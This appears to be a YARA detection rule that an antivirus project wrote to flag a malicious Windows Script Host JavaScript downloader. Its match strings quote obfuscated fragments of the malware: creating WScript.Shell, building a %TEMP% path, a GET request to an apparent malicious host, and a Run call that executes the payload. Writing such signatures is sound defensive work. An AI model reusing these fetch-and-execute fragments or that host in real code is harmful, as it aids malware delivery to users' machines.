rule sig_20160427_4c0ba688a639836de22c261e0e402a4e {
  meta:
    description = "datamaliciousorder - file 20160427_4c0ba688a639836de22c261e0e402a4e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f43b1f5ae60a19727104a726fe6c1e350222cffdc867aae2a1e0acb4bbf0a8da"

  strings:
    $s1  = "var SjbueHyhie = function TwrjaXtiyg() {return ZqfdrAthlf[DloseIrclp](\"WScript\"+\".Shell\");}(), MbpzbYtqyg = 11;" fullword ascii
    $s2  = "function LbumhCptfl() {return SjbueHyhie[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"xj2Xa45" ascii
    $s3  = "function LbumhCptfl() {return SjbueHyhie[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"xj2Xa45" ascii
    $s4  = "function NaojrOjuni(SbaloUzelc, UvxmwHduni){UdmfvBxrcl = UdmfvBxrcl * 1; return SbaloUzelc - UvxmwHduni;};" fullword ascii
    $s5  = "ThecfDzcem[GakknHulbw](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s6  = "var ZqfdrAthlf = this[\"WScript\"];" fullword ascii
    $s7  = "function NpmkzUaajj(){return DloseIrclp;};" fullword ascii
    $s8  = "if (ThecfDzcem[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function RtevrQitrr(){return BiqfxOdirp + \"\";};" fullword ascii
    $s10 = "function GgvzsAwlch() {return ((WqvayGngti == true) && (WqvayGngti == PrzyhLyzbr)) ? 1 : UdmfvBxrcl;};" fullword ascii
    $s11 = "function HrmsgHuqpb(ZthggHmmwf) {var WnnpoFmyfq = (1, 2, 3, 4, 5, ZthggHmmwf); return WnnpoFmyfq;};" fullword ascii
    $s12 = "function OkabgIfhwd(){return 23;};" fullword ascii
    $s13 = "return NaojrOjuni(EoklcBymoy, TwvfyMpbjz);" fullword ascii
    $s14 = "RzhhyAigxc = true;" fullword ascii
    $s15 = "WqvayGngti = true; " fullword ascii
    $s16 = "var ObgtfMgflu = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "var WqvayGngti = false;" fullword ascii
    $s18 = "var PrzyhLyzbr = false;" fullword ascii
    $s19 = "function EyrhvUjwve(SvdhySxfof){SjbueHyhie[\"R\"+\"un\"](SvdhySxfof, UdmfvBxrcl, UdmfvBxrcl);};" fullword ascii
    $s20 = "PrzyhLyzbr = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}